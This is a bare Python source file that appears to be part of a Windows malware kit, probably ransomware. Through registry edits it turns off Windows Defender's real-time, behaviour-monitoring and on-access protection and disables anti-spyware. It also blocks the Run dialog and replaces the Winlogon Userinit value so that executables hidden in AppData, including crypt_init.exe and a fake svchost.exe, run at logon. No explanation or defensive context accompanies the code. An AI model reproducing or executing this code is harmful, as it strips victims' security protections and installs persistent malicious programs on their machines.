#!/usr/bin/python
#coding:utf-8
import os, sys, time, winreg

# ENVIRONMENT VARIABLE
current_user = os.environ["USERNAME"]
letter_drive = os.environ["SystemDrive"]

class ManageKey():
    """ Class defining the rules to be added to the Windows registry """
    def __init__(self):
        self.values_windef   = ["/v DisableScanOnRealtimeEnable", "/v DisableBehaviorMonitoring", "/v DisableOnAccessProtection"]
        self.win_realtime    = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"'
        self.windef_path     = 'REG ADD "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware'
        self.path_win_r      = "REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun"
        self.unset_key       = 'REG DELETE "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit'
        self.new_key         = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\crypt_init.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\GuiCounter.exe, {}\\Users\\{}\\AppData\\Roaming\\DriversManager\\svchost.exe, {}\\Windows\\system32\\userinit.exe".format(letter_drive, current_user, letter_drive, current_user, letter_drive, current_user, letter_drive)
        self.force_cli       = "/f"
        self.key_type        = "/t REG_DWORD /d 1"
    # FUNCTION TO DEACTIVATE WINDEFENDER INTO REGISTRY    
    def setkey(self):
        for x in self.values_windef:
            self.values_windef   = x
            self.command_execute = "{} {} {} {}".format(self.win_realtime, x, self.key_type, self.force_cli)
            os.system(self.command_execute)
        self.windef_all_exec = "{} {} {}".format(self.windef_path, self.key_type, self.force_cli)
        os.system(self.windef_all_exec)
        self.block_windows_r = "{} {} {}".format(self.path_win_r, self.key_type, self.force_cli)
        os.system(self.block_windows_r)
    # FUNCTION TO DELETE USERINIT INTO REGISTRY        
    def delkey(self):
        self.exec_unset_key = "{} {}".format(self.unset_key, self.force_cli)
        os.system(self.exec_unset_key)
    # RULES TO STARTUP GUI COUNTER AND SVCHOST BEFORE LOGON ON WINDOWS
    def setInit(self):
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
        winreg.SetValueEx(key, 'Userinit',0, winreg.REG_SZ, self.new_key)
        winreg.CloseKey(key)
